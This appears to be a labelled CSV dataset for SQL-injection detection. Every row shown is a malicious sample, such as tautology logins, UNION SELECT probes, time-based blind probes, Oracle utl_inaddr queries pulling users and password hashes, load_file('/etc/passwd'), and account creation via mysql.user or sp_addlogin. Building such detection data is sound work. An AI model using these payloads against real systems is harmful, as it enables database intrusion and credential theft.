,Sentence,Label
38," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1
39,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1
40," select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1
41,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1
42," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",1
43," select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1
44," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1
45,select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1
46," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1
47," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1
48," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1
49,or 1 --',1
50," select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1
51,"admin"" or 1  =  1#",1
52," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1
53,\x27UNION SELECT,1
54,PRINT,1
55," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1
56,or 1  =  1--,1
57,1 or pg_sleep  (  __TIME__  )  --,1
58," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1
59,admin'  )   or   (  '1'  =  '1'/*,1
60,or 2 between 1 and 3,1
61," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1
62," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1
63,admin' or '1'  =  '1,1
65," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1
66,""" or 0  =  0 --",1
67," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1
68,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1
69," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1
70," select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1
71," select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1
72,char%4039%41%2b%40SELECT,1
73," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1
74,admin'  )   or   (  '1'  =  '1,1
75,declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1
76,"or 0  =  0 #""",1
77," select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1
78,  )   or   (  'x'  =  'x,1
79," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1
80,$  (  sleep 50  ) ,1
81," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1
82,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1
83," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1
84," select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1
85," select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1
86,"""a"""" or 1  =  1--""",1
87," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1
88," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
89," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1
90,1 and user_name  (    )     =   'dbo',1
91,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1
92," select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1
93," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1
94,select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1
95,select * from users where id  =  1 +$+. or 1  =  1 -- 1,1
96,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1
97," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
98,or 1  =  1 or ''  =  ',1
99,select * from users where id  =  1   or 1  =  1 -- 1,1
100,or 'text' > 't',1
101,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
102," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1
103," select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1
104,admin' or '1'  =  '1'#,1
105,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1
106,s,1
107," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
108, select * from information_schema.tables--,1
109," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1
110,1   )    )    or pg_sleep  (  __TIME__  )  --,1
111," select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1
112,declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1
113, or 1  =  1 or ''  =  ',1
114,select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1
115,declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1
116," select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1
117," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1
118,or 'unusual'   =   'unusual',1
119, or 1 in   (  select @@version  )  --,1
120,truncate,1
121,as,1
122, or 3  =  3 --,1
123," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1
124," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1
125,"admin""  )   or   (  ""1""  =  ""1",1
126," select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1
127,"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1
128," select * from users where id  =  1 union select .1_,version  (    )   -- 1",1
129, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1
130," or 0  =  0 #""",1
131,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1
132,select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1
133,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1
134,1  )   or sleep  (  __TIME__  )  #,1
135," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1
136," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1
137," select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1
138,select * from users where id  =  1. <@ or 1  =  1 -- 1,1
139, or true--,1
142,select * from users where id  =  1 <@ or 1  =  1 -- 1,1
143," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1
144,admin' #,1
145," select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1
146," select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1
147," select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1
148," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1
149,"""  )  ;waitfor delay '0:0:__TIME__'--",1
150, or 'unusual'   =   'unusual',1
151,"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1
152,"admin"" or ""1""  =  ""1""/*",1
153," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1
154," select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1
155,like,1
157, )    )    or pg_sleep  (  __TIME__  )  --,1
158,select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1
159,or 3  =  3,1
160," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1
161,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1
162,exec sp,1
163," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1
164,select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1
165," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1
166,admin' or 1  =  1/*,1
167,a' waitfor delay '0:0:10'--,1
168," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1
169," select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1
170,and 1 in   (  select var from temp  )  --,1
171,hi'  )   or   (  'a'  =  'a,1
172," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
173,"admin"" or 1  =  1",1
174,"""  )   or true--",1
175," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1
176," select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1
177,1  )   or pg_sleep  (  __TIME__  )  --,1
178," select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1
179,"""  )   or sleep  (  __TIME__  )    =  """,1
180,select * from users where id  =  1.<@. or 1  =  1 -- 1,1
181,"admin""  )   or   (  ""1""  =  ""1""--",1
182," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1
184," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1
185,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1
186," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1
187," select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1
188,1 and 1  =  1,1
189,or 0  =  0 #,1
190,union select * from users where login   =   char ...,1
191," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1
192,admin'  )   or '1'  =  '1'--,1
194," select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1
196," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1
197," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1
198," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
199,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1
200,procedure,1
201,or ''  =  ',1
202, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1
203," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
205," select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1
206,select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1
207,""" or """"^""",1
208,"""-""",1
209," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1
210," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1
211," select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1
212," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1
213," select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1
214,admin'/*,1
215," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1
216,||UTL_HTTP.REQUEST,1
217," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
218," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1
219,"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
220," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1
221," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1
222,select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1
223,1 uni/**/on select all from where,1
224," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1
225," select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1
226,admin'  )   or '1'  =  '1'#,1
227,||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
228,or '7659'  =  '7659,1
229," select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1
230," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1
231," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
232," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1
233,or true--,1
234," select * from users where id  =  1 union select !<1,version  (    )   -- 1",1
235," select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1
236," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1
237,""" or true--",1
238,select * from users where id  =  1. or 1  =  1 -- 1,1
239," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1
240," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1
241,â or 3  =  3 --,1
242, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1
243," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1
244," select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1
245," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1
246," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1
247," select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1
248, or uid like '%,1
249,select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1
250," select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1
252," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1
253," select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1
254," select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1
255,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1
256," select * from users where id  =  '1' union select \,@@VERSION -- 1'",1
257,0 or 1  =  1,1
258,select * from users where id  =  1 &@ or 1  =  1 -- 1,1
259,"admin""  )   or ""1""  =  ""1",1
260,select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1
261," select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1
262," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
263," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
266,select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1
267,select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1
268,""" or """"*""",1
269,"hi or 1  =  1 --""",1
270," select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1
272," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
273," select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1
274,select * from information_schema.tables--,1
275,select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1
276,   (  select top 1,1
277,Ã½ or 1  =  1 --,1
278,a' --,1
279, or 1  =  1 /*,1
280," select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1
281," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1
282,--,1
283,"exec sp_addlogin 'name' , 'password'",1
284," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1
285,0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1
286," select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1
287," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1
288,group by userid having 1  =  1--,1
289," select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1
290,select * from users where id  =  1 *1 or 1  =  1 -- 1,1
291," select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1
292,‘ or 1  =  1 --,1
293," select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1
294,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1
295,or 'a'  =  'a,1
296,declare @s varchar  (  22  )   select @s   = ,1
297," select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1
298," select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1
299," select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1
300,@variable,1
302,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1
303," select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1
304," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1
305," select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1
306," select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1
307, and 1 in   (  select var from temp  )  --,1
308," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1
309," select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1
310," select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1
311,or x  =  x,1
312,or a  =  a,1
313,or '1'  =  '1,1
314," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1
315,   )    )    or    (    (   'x'   )    )     =     (    (   'x,1
316," select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1
317," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1
318," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
320,select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1
321," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1
322," select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1
323," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1
324," select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1
325,a' or 1  =  1--,1
326, )   or   (  a  =  a,1
327,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1
328," select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1
329," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1
330,-- &password  = ,1
331,select * from users where id  =  1 <@. or 1  =  1 -- 1,1
332," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1
333," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1
334," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
335, or '1'  =  '1,1
336,admin' or 1  =  1,1
337," select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1
338," select * from users where id  =  1 union select @||1,version  (    )   -- 1",1
339," select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1
340," select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1
341," union select * from users where login   =   char  (  114,111,111,116  )  ;",1
342," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1
343, or 1  =  1--,1
344," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
345,pg_sleep  (  __TIME__  )  --,1
346,‘ or 3  =  3 --,1
347," select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1
348," select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1
350," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1
351,"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1
352, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,1
353," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
354,""" or """" """,1
355,delete,1
357, or 1  =  1 --,1
358,1' and non_existant_table   =   '1,1
359," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1
360," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1
361,declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1
363," select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1
364," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1
365," select * from users where id  =  1 union select @<@,version  (    )   -- 1",1
366," select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1
367, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1
368," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
369,select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1
370," select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1
371," select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1
372,UNION ALL SELECT,1
373," select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1
374,select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1
375," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1
376,x' or full_name like '%bob%,1
378, or 2 > 1,1
379,select * from users where id  =  1.*1 or 1  =  1 -- 1,1
380,"""  )   or pg_sleep  (  __TIME__  )  --",1
381, ',1
382," select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",1
383," select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1
384,select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1
385, )   or sleep  (  __TIME__  )    =  ',1
386,sleep 50',1
387," select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
388,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1
389," select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1
390,or sleep  (  __TIME__  )    =  ',1
391," select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1
392," select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1
393," select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1
394," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1
395," select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1
396,or 2 > 1,1
398,anything' OR 'x'  =  'x,1
399," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1
400," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1
401," select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",1
402,&',1
403,a' or 3  =  3--,1
404," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1
405," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1
406,"admin""or 1  =  1 or """"  =  """,1
407,uni/**/on sel/**/ect,1
408,""" or """"&""",1
410," select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1
411,1 waitfor delay '0:0:10'--,1
412,bfilename,1
413,admin'  )   or   (  '1'  =  '1'--,1
414,UEf,1
415, -- &password  = ,1
416,1 or sleep  (  __TIME__  )  #,1
417," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
418," select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1
